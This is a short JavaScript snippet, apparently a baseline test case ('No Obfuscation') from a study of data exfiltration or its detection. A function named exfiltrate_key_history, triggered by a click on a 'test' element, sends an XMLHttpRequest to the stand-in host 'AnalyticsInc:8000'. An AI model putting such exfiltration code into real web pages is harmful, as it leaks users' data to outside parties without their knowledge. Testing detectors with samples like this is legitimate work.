function exfiltrate_key_history() {

    // Baseline - No Obfuscation
    // Exfiltrate data using XMLHTTP request
    xmlhttp=new XMLHttpRequest();
    xmlhttp.open("GET", "http://AnalyticsInc:8000/submission.html?test=baseline", true);
    xmlhttp.send(null);
	
}

document.getElementById('test').onclick = exfiltrate_key_history;
